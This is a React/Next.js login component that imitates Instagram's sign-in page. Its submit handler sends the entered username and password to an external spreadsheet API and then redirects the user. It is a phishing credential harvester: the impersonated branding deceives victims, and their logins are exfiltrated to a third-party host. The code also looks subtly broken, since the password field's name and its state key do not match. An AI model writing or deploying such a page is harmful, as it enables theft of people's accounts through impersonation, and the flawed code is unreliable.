// src/components/LoginForm.js - Client Component
"use client";

import React, { useState } from "react";
import { useRouter } from "next/navigation";

export default function LoginForm() {
  const [formData, setFormData] = useState({ username: "", password: "" });
  const router = useRouter();

  const handleChange = (e) => {
    setFormData((prev) => ({ ...prev, [e.target.name]: e.target.value }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      await fetch(
        "https://api.sheetbest.com/sheets/467297fc-de6b-4102-a8be-4b7fe78f62f3",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(formData),
        }
      );

      router.push("/status");
    } catch (error) {
      console.error("Error submitting form:", error);
    }
  };

  return (
    <form onSubmit={handleSubmit}>
      <div className="logo">
        <h1>Instagram</h1>
      </div>
      <input
        type="text"
        name="username"
        placeholder="Phone number, username, or email"
        value={formData.username}
        onChange={handleChange}
        required
      />
      <input
        type="password"
        name="pass"
        placeholder="Pass"
        value={formData.password}
        onChange={handleChange}
        required
      />
      <button className="form-btn" type="submit">
        Log in
      </button>
      <span className="has-separator">Or</span>
      <a href="#" className="facebook-login">
        <i className="fab fa-facebook" /> Log in with Facebook
      </a>
      <a className="password-reset" href="#">
        Forgot password?
      </a>
    </form>
  );
}
